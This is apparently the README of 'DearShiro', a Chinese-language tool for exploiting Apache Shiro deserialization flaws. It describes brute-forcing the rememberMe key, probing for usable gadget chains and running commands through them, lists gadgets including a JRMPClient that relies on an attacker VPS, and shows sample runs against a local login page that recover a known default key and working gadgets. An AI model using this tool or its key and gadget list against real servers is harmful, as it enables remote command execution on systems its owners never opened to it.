# DearShiro

**一个不万能的Shiro扫描工具**

人类低质量代码，就当练个手。

目前已完成:
- Key的探测
- 可用Gadget的探测
- 利用Gadget执行命令


后续todo:
- 图形化？
- 修复某些未知BUG


由于Shiro在反序列化的时候无法加载除Java本身自带的数组，所以可利用的Gadget有限。

目前可用Gadget:
- CommonsBeanUtilsNoCC
- CommonsCollectionsK1
- CommonsCollectionsK2
- JRMPClient（需要在VPS上首先开启一个JRMPServer）

初步测试：

```
❯ java -jar dearshiro.jar -m "key" -b "http://127.0.0.1:8000/login.jsp"                                                                              
[+] Test key: 0AvVhmFLUs0KTA3Kprsdag==
[-] Response Code: 200
[+] Test key: kPH+bIxk5D2deZiIxcaaaA==
[-] Response Code: 200
[*] Found Key: kPH+bIxk5D2deZiIxcaaaA==


❯ java -jar dearshiro.jar -m "gadgetfuzz" -b "http://127.0.0.1:8000/login.jsp" -k "kPH+bIxk5D2deZiIxcaaaA=="    
[main] INFO org.reflections.Reflections - Reflections took 18 ms to scan 1 urls, producing 1 keys and 5 values 
[+] Test Gadget: CCK2
[-] Response Code: 200
[+] Test Gadget: NoCC
[-] Response Code: 200
[*] Found Gadget: NoCC
[+] Test Gadget: JRMPClient
[-] Response Code: 200
[+] Test Gadget: CCK1
[-] Response Code: 200
[*] Found Gadget: CCK1
########Available Gadget##########
NoCC
CCK1
########Available Gadget##########

```

